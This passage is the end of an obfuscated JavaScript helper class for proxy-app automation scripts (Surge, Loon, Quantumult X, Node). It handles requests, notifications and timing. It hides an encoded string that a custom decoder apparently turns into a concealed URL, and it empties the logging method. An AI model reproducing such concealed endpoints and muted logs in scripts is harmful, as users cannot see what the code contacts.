      const _0x22b260 = _0x4f1349["method"] ? _0x4f1349["method"]["toLocaleLowerCase"]() : "post";

      if (_0x4f1349["body"] && _0x4f1349["headers"] && !_0x4f1349["headers"]["Content-Type"] && (_0x4f1349["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), _0x4f1349["headers"] && delete _0x4f1349["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
        const _0x28dc19 = {
          "X-Surge-Skip-Scripting": false
        };
        this["isSurge"]() && this["isNeedRewrite"] && (_0x4f1349["headers"] = _0x4f1349["headers"] || {}, Object["assign"](_0x4f1349["headers"], _0x28dc19));

        $httpClient[_0x22b260](_0x4f1349, (_0x5cbc6a, _0x2eceac, _0x1b4ea7) => {
          !_0x5cbc6a && _0x2eceac && (_0x2eceac["body"] = _0x1b4ea7, _0x2eceac["statusCode"] = _0x2eceac["status"]);

          _0x2c1931(_0x5cbc6a, _0x2eceac, _0x1b4ea7);
        });
      } else {
        if (this["isQuanX"]()) {
          _0x4f1349["method"] = _0x22b260;
          const _0x14b51c = {
            "hints": false
          };
          this["isNeedRewrite"] && (_0x4f1349["opts"] = _0x4f1349["opts"] || {}, Object["assign"](_0x4f1349["opts"], _0x14b51c));
          $task["fetch"](_0x4f1349)["then"](_0x349a40 => {
            const {
              "statusCode": _0x35b945,
              "statusCode": _0x1b2cf4,
              "headers": _0x571314,
              "body": _0x1535bf
            } = _0x349a40,
                  _0x908a05 = {
              "status": _0x35b945,
              "statusCode": _0x1b2cf4,
              "headers": _0x571314,
              "body": _0x1535bf
            };

            _0x2c1931(null, _0x908a05, _0x1535bf);
          }, _0x1a086e => _0x2c1931(_0x1a086e));
        } else {
          if (this["isNode"]()) {
            let _0x395217 = require("iconv-lite");

            this["initGotEnv"](_0x4f1349);
            const {
              "url": _0x144fb1,
              ..._0x4738d7
            } = _0x4f1349;

            this["got"][_0x22b260](_0x144fb1, _0x4738d7)["then"](_0x20e5e5 => {
              const {
                "statusCode": _0x5e956f,
                "statusCode": _0x30b36b,
                "headers": _0x304021,
                "rawBody": _0x559766
              } = _0x20e5e5,
                    _0x5e3a37 = {
                "status": _0x5e956f,
                "statusCode": _0x30b36b,
                "headers": _0x304021,
                "rawBody": _0x559766
              };

              _0x2c1931(null, _0x5e3a37, _0x395217["decode"](_0x559766, this["encoding"]));
            }, _0x353bac => {
              const {
                "message": _0x38a6f6,
                "response": _0x5660af
              } = _0x353bac;

              _0x2c1931(_0x38a6f6, _0x5660af, _0x5660af && _0x395217["decode"](_0x5660af["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    ["time"](_0x5a1fba, _0x25a31d = null) {
      const _0x2df566 = _0x25a31d ? new Date(_0x25a31d) : new Date();

      let _0x13f4a5 = {
        'M+': _0x2df566["getMonth"]() + 1,
        'd+': _0x2df566["getDate"](),
        'H+': _0x2df566["getHours"](),
        'm+': _0x2df566["getMinutes"](),
        's+': _0x2df566["getSeconds"](),
        'q+': Math["floor"]((_0x2df566["getMonth"]() + 3) / 3),
        'S': _0x2df566["getMilliseconds"]()
      };
      /(y+)/["test"](_0x5a1fba) && (_0x5a1fba = _0x5a1fba["replace"](RegExp['$1'], (_0x2df566["getFullYear"]() + '')["substr"](4 - RegExp['$1']["length"])));

      for (let _0x4986f9 in _0x13f4a5) new RegExp('(' + _0x4986f9 + ')')["test"](_0x5a1fba) && (_0x5a1fba = _0x5a1fba["replace"](RegExp['$1'], 1 == RegExp['$1']["length"] ? _0x13f4a5[_0x4986f9] : ('00' + _0x13f4a5[_0x4986f9])["substr"](('' + _0x13f4a5[_0x4986f9])["length"])));

      return _0x5a1fba;
    }

    ["msg"](_0x2b6b61 = _0x5dbf42, _0x5ecd7b = '', _0x314cec = '', _0x40fdc3) {
      const _0x166bd0 = _0x57c8a3 => {
        if (!_0x57c8a3) {
          return _0x57c8a3;
        }

        if ("string" == typeof _0x57c8a3) {
          return this["isLoon"]() ? _0x57c8a3 : this["isQuanX"]() ? {
            'open-url': _0x57c8a3
          } : this["isSurge"]() ? {
            'url': _0x57c8a3
          } : void 0;
        }

        if ("object" == typeof _0x57c8a3) {
          if (this["isLoon"]()) {
            let _0xf09d27 = _0x57c8a3["openUrl"] || _0x57c8a3["url"] || _0x57c8a3["open-url"],
                _0x1aaa42 = _0x57c8a3["mediaUrl"] || _0x57c8a3["media-url"];

            const _0x3f9db0 = {
              "openUrl": _0xf09d27,
              "mediaUrl": _0x1aaa42
            };
            return _0x3f9db0;
          }

          if (this["isQuanX"]()) {
            let _0xc8359c = _0x57c8a3["open-url"] || _0x57c8a3["url"] || _0x57c8a3["openUrl"],
                _0x34b8b3 = _0x57c8a3["media-url"] || _0x57c8a3["mediaUrl"];

            const _0x4625b0 = {
              "open-url": _0xc8359c,
              "media-url": _0x34b8b3
            };
            return _0x4625b0;
          }

          if (this["isSurge"]()) {
            let _0x26a5b5 = _0x57c8a3["url"] || _0x57c8a3["openUrl"] || _0x57c8a3["open-url"];

            const _0xddab2b = {
              "url": _0x26a5b5
            };
            return _0xddab2b;
          }
        }
      };

      if (this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification["post"](_0x2b6b61, _0x5ecd7b, _0x314cec, _0x166bd0(_0x40fdc3)) : this["isQuanX"]() && $notify(_0x2b6b61, _0x5ecd7b, _0x314cec, _0x166bd0(_0x40fdc3))), !this["isMuteLog"]) {
        let _0x174cde = ['', "==============📣系统通知📣=============="];

        _0x174cde["push"](_0x2b6b61);

        _0x5ecd7b && _0x174cde["push"](_0x5ecd7b);
        _0x314cec && _0x174cde["push"](_0x314cec);
        console["log"](_0x174cde["join"]("\n"));
        this["logs"] = this["logs"]["concat"](_0x174cde);
      }
    }

    ["fwcaas"]() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }

    ["log"](..._0xfb8756) {}

    ["logErr"](_0x5208bf, _0x69390c) {
      const _0xfa4740 = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();

      _0xfa4740 ? this["log"]('', '❗️' + this["name"] + ", 错误!", _0x5208bf["stack"]) : this["log"]('', '❗️' + this["name"] + ", 错误!", _0x5208bf);
    }

    ["fwur"]() {
      var _0x1e95ed = new FxPCnMKLw7();

      return _0x1e95ed["decode"](this["fwcaas"]());
    }

    ["wait"](_0x5e24cb) {
      return new Promise(_0x52b8c7 => setTimeout(_0x52b8c7, _0x5e24cb));
    }

    ["done"](_0x61c432 = {}) {
      const _0x33162d = new Date()["getTime"](),
            _0x719be8 = (_0x33162d - this["startTime"]) / 1000;

      this["log"]('', '🔔' + this["name"] + ", 结束! 🕛 " + _0x719be8 + " 秒");
      this["log"]();
      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(_0x61c432);
    }

  }(_0x5dbf42, _0x4bce0e);
}
